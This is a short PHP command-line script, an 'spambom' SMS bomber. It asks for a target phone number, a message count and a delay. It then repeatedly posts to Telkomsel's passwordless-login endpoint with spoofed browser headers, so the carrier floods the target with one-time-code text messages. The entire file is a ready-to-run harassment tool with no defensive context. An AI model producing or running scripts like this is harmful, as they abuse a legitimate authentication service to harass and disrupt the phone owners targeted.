<?php
function spambom( $no, $jum, $wait){
    $x = 0;
    while ( $x < $jum){
        $ch = curl_init();
        curl_setopt( $ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt( $ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec($ch);
        curl_close($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Nomor target : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah pesan : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda : ";
$waktu = trim(fgets(STDIN));
$execute = spambom($nomor, $jumlah, $waktu);
print $execute;
?>